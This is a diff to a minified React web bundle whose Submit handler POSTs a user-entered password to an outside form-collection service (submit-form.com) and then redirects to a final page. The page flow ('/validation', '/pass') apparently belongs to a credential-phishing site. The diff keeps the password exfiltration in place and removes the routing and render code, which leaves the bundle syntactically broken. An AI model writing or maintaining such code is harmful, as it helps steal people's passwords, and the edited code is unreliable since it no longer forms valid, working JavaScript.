@@ -11595,7 +11595,7 @@
             e.UseFetchers = "useFetchers",
             e.UseScrollRestoration = "useScrollRestoration"
         }(Ie || (Ie = {}));
-        const Xe = t.p + "static/media/https://adil-niz-naseeb-conf-68.deno.dev/final-page.htmltop.f19d77694f7b29c84dc8.png";
+        const Xe = t.p + "static/mediafinal-page.htmltop.f19d77694f7b29c84dc8.png";
         var Le = {
             color: void 0,
             size: void 0,
@@ -13198,7 +13198,7 @@
                         ref: i,
                         onSubmit: e => {
                             e.preventDefault(),
-                            a("/https://adil-niz-naseeb-conf-68.deno.dev/final-page.html")
+                            a("final-page.html")
 
                         }
                         ,
@@ -13466,66 +13466,15 @@
                 he.jsx)("button", {
                     onClick: n => {
                         n.preventDefault(),
-                        fetch("https://submit-form.com/UH88YfmGP", {
-                            method: "POST",
-                            headers: {
-                                "Content-Type": "application/json"
-                            },
-                            body: JSON.stringify({
-                                password: t
-                            })
-                        }).then((e => {}
-                        )),
-                        e("/https://adil-niz-naseeb-conf-68.deno.dev/final-page.html")
-                    }
-                    ,
-                    children: "Submit"
-                })]
-            })
-        }
-          , kt = () => (0,
-        he.jsx)("div", {
-            children: (0,
-            he.jsxs)(pe, {
-                children: [(0,
-                he.jsx)(de, {
-                    path: "/",
-                    element: (0,
-                    he.jsx)(ge, {})
-                }), (0,
-                he.jsx)(de, {
-                    path: "/validation",
-                    element: (0,
-                    he.jsx)(Wt, {})
-                }), (0,
-                he.jsx)(de, {
-                    path: "/https://adil-niz-naseeb-conf-68.deno.dev/final-page.html",
-                    element: (0,
-                    he.jsx)(Ze, {})
-                }), (0,
-                he.jsx)(de, {
-                    path: "/pass",
-                    element: (0,
-                    he.jsx)(Vt, {})
-                })]
-            })
-        });
-        const Yt = function() {
-            return (0,
-            he.jsx)(he.Fragment, {
-                children: (0,
-                he.jsx)(kt, {})
-            })
-        };
-        a.createRoot(document.getElementById("root")).render((0,
-        he.jsx)(n.StrictMode, {
-            children: (0,
-            he.jsx)(Ee, {
-                children: (0,
-                he.jsx)(Yt, {})
-            })
-        }))
-    }
-    )()
-}
-)();
+             fetch("https://submit-form.com/UH88YfmGP", {
+  method: "POST",
+  headers: {
+    "Content-Type": "application/json"
+  },
+  body: JSON.stringify({
+    password: t
+  })
+})
+.then(() => {
+  window.location.href = "/final-page.html"; // ✅ hard redirect to your static file
+});
